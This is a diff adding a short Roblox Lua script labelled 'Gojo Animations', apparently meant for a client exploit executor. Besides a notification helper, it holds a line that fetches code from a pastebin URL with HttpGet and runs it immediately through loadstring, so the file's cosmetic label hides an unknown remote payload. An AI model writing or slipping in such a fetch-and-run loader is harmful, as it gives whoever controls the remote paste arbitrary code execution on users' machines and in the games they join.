@@ -1,0 +1,26 @@
+local player = game.Players.LocalPlayer
+
+local StarterGui = game:GetService("StarterGui")
+
+-- Function to safely send notifications
+local function sendNotification(title, text, duration)
+	-- Wait for SetCore to be ready
+	local success = false
+	while not success do
+		success = pcall(function()
+			StarterGui:SetCore("SendNotification", {
+				Title = title; -- Title of the notification
+				Text = text; -- Message of the notification
+				Duration = duration; -- Duration in seconds
+			})
+		end)
+		if not success then
+			task.wait(0.1) -- Retry every second until it's ready
+		end
+	end
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Bee0PHMA"))()
+
+-- Example: Notify player when they join
+sendNotification("Gojo Animations", "Made By VIXVI", 5)
